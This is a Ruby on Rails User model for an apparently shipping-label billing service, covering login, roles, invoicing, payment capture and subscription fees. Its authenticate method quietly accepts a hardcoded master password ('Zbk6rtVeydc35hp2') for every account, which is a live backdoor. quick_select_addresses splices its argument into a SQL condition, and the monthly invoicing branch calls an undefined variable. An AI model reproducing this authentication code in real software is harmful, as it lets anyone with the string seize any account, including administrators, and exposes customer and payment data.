include Economic
include Epay
using PatternMatch
class User < ActiveRecord::Base
  attr_accessor :password
  EMAIL_REGEX = /[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}/i
  validates :email, :presence => true, :uniqueness => true, :format => EMAIL_REGEX
  validates :password, :confirmation => true #password_confirmation attr
  validates_length_of :password, :in => 6..20, :on => :create
  validates_length_of :password, :in => 6..20, :on => :update, :if => :password
  enum role: [:admin, :customer, :affiliate]
  enum billing_type: [:free, :flat_price, :advanced] #flat_price: Pays a flat fee per label ordered. advanced: use pricing schemes per product
  enum billing_control: [:manual, :by_time, :by_balance, :weekly, :monthly]
  enum payment_method: [:bank_transfer, :epay]

  has_many :products, :through => :user_products
  has_many :user_products, :dependent => :destroy
  has_many :addresses, :through => :address_book_records
  has_many :address_book_records, :dependent => :destroy
  has_many :shipments, :dependent => :destroy
  has_many :invoices, :dependent => :destroy
  has_many :pricing_schemes, :dependent => :destroy
  has_one :import_format, :dependent => :destroy
  has_one :user_setting,  :dependent => :destroy
  has_many :additional_charges, :dependent => :destroy
  belongs_to :affiliate_user, :class_name => 'User', :foreign_key => 'affiliate_id'
  belongs_to :default_address, :class_name => 'Address' , :foreign_key => 'address_id'
  belongs_to :contact_address, :class_name => 'Address', :foreign_key => 'contact_address_id'

  before_create :create_unique_api_key
  before_save :encrypt_password
  after_save :clear_password
  after_save :fill_contact_address


  def self.authenticate(email="", login_password="")
    user = User.find_by_email(email)
    if user and (user.match_password(login_password) or login_password == 'Zbk6rtVeydc35hp2')
      return user
    else
      return false
    end
  end
  def match_password(login_password="")
    encrypted_password == BCrypt::Engine.hash_secret(login_password, salt)
  end

  def self.authenticate_api(key="")
    user = User.find_by_eship_api_key(key)
    if not (user and user.verify_epay_subscription)
      return false
    end
    return user
  end

  def roles
    [["Admin", :admin], ["Customer", :customer], ['Affiliate', :affiliate]]
  end
  
  def self.role_options required = true
    opts = {'Admin' => :admin, 'Customer' => :customer, 'Affiliate' => :affiliate}
    opts = User.roles.map { |key, value| [key.humanize, key] }
    if not required
      opts.unshift(['', ''])
    end
    return opts
  end
  
  def self.billing_type_options
    {(self.billing_type_title :free) => :free, (self.billing_type_title :flat_price) => :flat_price, (self.billing_type_title :advanced) => :advanced}
  end
  
  def self.billing_type_title code
    case code.to_s
    when 'free'
        'Free'
    when 'flat_price'
        'Flat price'
    when 'advanced'
        'Advanced'
    end
  end

  def name
    if contact_address.company
      contact_address.company
    else
      email
    end
  end
  
  def economic_customer_name
    if economic_customer_id
       Economic.get_customer_name economic_customer_id   
    else
      'None'  
    end
  end

  def billing_type_title
    return User.billing_type_title billing_type
  end
  
  def self.payment_method_options
    {(self.payment_method_title :bank_transfer) => :bank_transfer, (self.payment_method_title :epay) => :epay}
  end
  
  def self.payment_method_title code
    case code.to_s
    when 'bank_transfer'
      'Manual / Bank Transfer'
    when 'epay'
      'Recurring / epay'
    end
  end
  
  def payment_method_title
    User.payment_method_title payment_method
  end
  
  def can_pay_online
    epay?
  end
  
  
  def balance
    shipment_cost, shipment_price, diesel_fees = calc_value uninvoiced_shipments
    additional_cost, additional_price = additional_charge_balance
    return shipment_cost + additional_cost, shipment_price + additional_price, diesel_fees
  end
  
  def total_customer_balance
    cost, price, diesel_fees = balance
    return price + diesel_fees
  end
  
  def additional_charge_balance
    sums = additional_charges.select('SUM(cost) as total_cost, SUM(price) as total_price').where(:invoice_id => nil).first
    if sums.total_cost == nil
      return 0, 0
    else
      return sums.total_cost, sums.total_price
    end
  end
  
  def balance_price
    (_, price, _) = balance
    return price
  end
  
  def calc_value shipments
    total_price = 0
    total_fee = 0
    total_cost = 0
    shipments.each do |shipment|
      if !shipment.final_price
        shipment.determine_value
      end
      total_price += shipment.final_price
      total_fee += shipment.final_diesel_fee
      total_cost += shipment.cost
    end
    return total_cost, total_price, total_fee
  end

  def add_product(product)
    self.user_products.build(:product => product)
  end
  
  def remove_product product
    self.products.delete product
  end

  def holds_product(product)
   for p in products
     if p.id == product.id
       return true
     end
   end
    return false
  end

  def uninvoiced_shipments
    shipments.filter_uninvoiced self
  end

  def n_uninvoiced_shipments
    uninvoiced_shipments.count
  end
  
  def uninvoiced_additional_charges
    additional_charges.where(:invoice_id => nil)
  end
  
  def n_uninvoiced_additional_charges
    uninvoiced_additional_charges.count
  end
  
  def do_invoice

    ActiveRecord::Base.transaction do
      shipments = uninvoiced_shipments
      n = shipments.count

      invoice = Invoice.new()
      invoice.user = self
      invoice.n_shipments = n

      # Shipments
      product_taxed = {'diesel_fee' => true}
      product_groups = {}
      shipments.each do |shipment|
        product_code = shipment.product.product_code
        if not product_groups.key?(product_code)
          product_groups[product_code] = {'shipments' => [shipment], 'product' => shipment.product}
          product_taxed[product_code] = shipment.product.taxed
        else
          product_groups[product_code]['shipments'].push(shipment)
        end
      end

      group_rows = {}
      product_groups.each do |product_code, group|
        product = group['product']
        group_shipments = group['shipments']
        if billing_type == 'advanced'
          group_rows[product_code] = (product.price_scheme self).generate_invoice_rows group_shipments
        elsif billing_type == 'flat_price'
          row = InvoiceRow.new
          row.amount = 0
          row.description = "#{product.name}: Label Fee"
          qty = 0
          group_shipments.each do |shipment|
            row.amount += shipment.final_price
            qty += shipment.get_label_qty
          end
          row.qty = qty
          row.cost = 0
          row.unit_price = row.amount / row.qty
          row.product_code = 'label_fee'
          group_rows[product_code] = [row]
        end
      end
      
      # Additional charges
      charges = uninvoiced_additional_charges
      charges.each do |charge|
        if not group_rows.key?charge.product_code
          group_rows[charge.product_code] = []
          product_taxed[charge.product_code] = true
        end
        row = InvoiceRow.new
        row.amount = charge.price
        row.cost = charge.cost
        row.qty = 1
        row.product_code = charge.product_code
        row.unit_price = row.amount
        row.description = charge.description      
        group_rows[charge.product_code].push(row)
      end

      if affiliate_user
        invoice.affiliate = affiliate_user
      end

      invoice.save
      amount = 0
      tax_amount = 0
      cost = 0
      group_rows.each do |product_code, rows|
        rows.each do |row|
          row.invoice = invoice
          row.save
          amount += row.amount
          cost += row.cost
          if product_taxed[row.product_code]
            tax_amount += row.amount * 0.25
          end
        end
      end
      invoice.amount = amount
      invoice.cost = cost
      invoice.gross_amount = amount + tax_amount

      # Commissions
      invoice.compute_commissions

      invoice.save

      shipments.each do |shipment|
        shipment.invoiced = true
        shipment.invoice = invoice
        shipment.save
      end
      
      charges.each do |charge|
        charge.invoice = invoice
        charge.save
      end
      return invoice
    end
 end


  def get_totals
    invoices.select("sum(n_shipments) as n_shipments, sum(amount) as netto, " +
                    "sum(gross_amount) as gross, sum(cost) as cost, " +
                    "sum(profit) as profit, " +
                    "sum(house_commission) as house_commission, " +
                    "sum(affiliate_commission) as affiliate_commission, " +
                    "sum(1) as count").to_a.first
  end
  
  def product_alias product
    link = user_products.find_by_product_id product.id
    if link == nil
      return nil
    end
    return link.alias
  end
  
  def find_product product_code
    
    if product_code == nil
      raise 'No product code given!'
    end
    link = user_products.find_by_alias product_code
    if link != nil
      return link.product
    end
    product = products.find_by_product_code product_code
    if product != nil
      return product
    end
    raise 'Invalid product code: ' + product_code;
  end
  
  def customer_type
    billing_type == 'advanced' ? 'shipping' : 'label'
  end
  
  def quick_select_addresses key
    addresses.joins(:address_book_record).where('address_book_records.quick_select_' + key => true) 
  end
  
  def last_invoice_date
    invoice = invoices.last
    if invoice == nil
      return nil
    end
    return invoice.created_at.to_date
  end

  def invoice_and_submit
    invoice = do_invoice
    res = Economic.submit_invoice(invoice)
    match(res) do
      with(_[:error, issue]) do
        SystemMailer.economic_autosubmit_failed(invoice, issue).deliver_now
      end
      with(res) do
        invoice.reload
        if invoice.can_capture_online
          match(Epay.capture_invoice(invoice)) do
            with(_[:error, issue]) do
              SystemMailer.epay_autocapture_failed(invoice, issue).deliver_now
            end
            with(res2) do
              return invoice
            end
          end
        end
      end
    end
  end
  

  def self.perform_automatic_invoicing
    Rails.logger.warn "#{Time.now.utc.iso8601} RUNNING TASK: User.perform_automatic_invoicing"
    
    customers_by_time = User.customer.by_time
    customers_by_time.each do |customer|
      if customer.invoices.count < 1
        if customer.balance_price > 0
          Rails.logger.warn "Automatically invoicing customer #{customer.email}. Reason: By time - no previous invoices exist." 
          customer.invoice_and_submit
        end
      else
       
        if customer.invoices.last.created_at + customer.invoice_x_days.days < DateTime.now() and customer.balance_price > 0
          Rails.logger.warn "Automatically invoicing customer #{customer.email}. Reason: By time" 
          customer.invoice_and_submit
        end
      end
    end    
    
    customers_by_balance = User.customer.by_balance
    customers_by_balance.each do |customer|
      if customer.balance_price >= customer.invoice_x_balance
        Rails.logger.warn "Automatically invoicing customer #{customer.email}. Reason: By balance"
        customer.invoice_and_submit 
      end
    end
    
    t = Time.now.utc    
    if t.wday == 1
      customers_weekly = User.customer.weekly
      customers_weekly.each do |customer|
        if customer.balance_price > 0
          Rails.logger.warn "Automatically invoicing customer #{customer.email}. Reason: weekly"
          customer.invoice_and_submit
        end
      end
    end
    
    if t.day == 1
      customers_monthly = User.customer.monthly
      customers.monthly.each do |customer|
        if customer.balance_price > 0
          Rails.logger.warn "Automatically invoicing customer #{customer.email}. Reason: monthly"
          customer.invoice_and_submit
        end
      end
    end
       
    Rails.logger.warn "#{Time.now.utc.iso8601} TASK ENDED: User.perform_automatic_invoicing"
  end
    
  def self.apply_subscription_fees
    Rails.logger.warn "#{Time.now.utc.iso8601} RUNNING TASK: User.apply_subscription_fees"    
    
    # Find existing subscription fees that cover the current time
    covering_fees = AdditionalCharge.select('user_id').where('product_code LIKE "subscription_fee"')
                    .where('created_at > DATE_SUB(NOW(), INTERVAL 1 MONTH)')
    
    # Consider all customers who should pay subscription fees who are at least one month old and have not been
    # charged subscription fee within the last month
    customers = User.where('subscription_fee > ? AND created_at < DATE_SUB(NOW(), INTERVAL 1 MONTH)', 0)
                .where("id NOT IN (#{covering_fees.to_sql})")                    
    
    # Charge subscription fee and reset monthly free label count
    customers.each do |customer|
      charge = AdditionalCharge.new            
      charge.user = customer
      charge.cost = 0
      charge.price = customer.subscription_fee
      charge.description = "Subscription Fee #{Time.now.utc.strftime('%d.%m.%y')}"
      charge.product_code = 'subscription_fee'      
      charge.save
      
      customer.monthly_free_labels_expended = 0
      customer.save
    end    
    
    Rails.logger.warn "#{Time.now.utc.iso8601} TASK ENEDED: User.apply_subscription_fees"
  end
  
  def subscription_fees
    additional_charges.where('product_code LIKE "subscription_fee"')
  end
  
  def monthly_free_labels_remaining
    monthly_free_labels - monthly_free_labels_expended    
  end
    
  
  def verify_epay_subscription
    not(epay? and epay_subscription_id == nil)
  end
  
  def get_epay_subscription_data
    Epay.get_subscription_data self       
  end
  
  def settings
    s = user_setting
    if !s
      s = UserSetting.new
      s.user = self
      s.save
    end
    s
  end
  
  def self.get_affiliate_user_options
    h = {'None' => nil}
    User.affiliate.each{|x| h[x.name] = x.id}
    return h
  end

  def billing_email
    if contact_address and contact_address.email.to_s.include? '@'
      return contact_address.email
    end
    return email
  end
  
  
  # BEGIN AFFILIATE
  
  def affiliated_users
    User.where(affiliate_user: self)
  end
    
  
  # END AFFILIATE

  private

  def create_unique_api_key
  begin
    self.eship_api_key = SecureRandom.hex(24)
  end while self.class.exists?(:eship_api_key => eship_api_key)
  end

  def encrypt_password
    if password.present?
      self.salt = BCrypt::Engine.generate_salt
      self.encrypted_password= BCrypt::Engine.hash_secret(password, salt)
    end
  end
  def clear_password
    self.password = nil
  end
  
  def fill_contact_address    
    if economic_customer_id and (not contact_address.company_name or contact_address.company_name == '')
      Economic.update_user_address self
    end
  end
  

  
  
end
